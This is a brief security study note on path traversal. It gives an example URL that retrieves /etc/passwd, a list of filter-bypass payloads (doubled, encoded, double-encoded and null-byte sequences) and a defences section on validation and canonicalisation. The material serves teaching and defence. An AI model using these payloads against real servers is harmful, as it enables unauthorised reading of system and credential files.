# Path traversal
1. [Bypass defences](https://github.com/francescovolpe/Cyber-Security-Notes/blob/main/Web%20vulnerabilities/Path%20traversal.md#bypass-defences)
2. [Defences](https://github.com/francescovolpe/Cyber-Security-Notes/blob/main/Web%20vulnerabilities/Path%20traversal.md#defences)

- ` <img src="/loadImage?filename=218.png"> `
- An attacker can request the following URL to retrieve the /etc/passwd file from the server's filesystem
- ` https://insecure-website.com/loadImage?filename=../../../etc/passwd `
- On Windows, both ../ and ..\ are valid directory traversal sequences

## Bypass defences
- elimination (strip):  `../ ` -> `....// `
- encode: ` %2e%2e%2f `
- double-encode: ` %252e%252e%252f `
- require to start with the expected base folder es. `/var/www/images` -> `filename=/var/www/images/../../../etc/passwd`
- require to end with an expected file extension es. `.php` -> `filename=../../../etc/passwd%00.png`
- others

## Defences
- Avoid passing user-supplied input to filesystem APIs
- Use two layers of defense to prevent attacks
  - Validate the user input before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn't possible, verify that the input contains only permitted content, such as alphanumeric characters only.
  - After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.
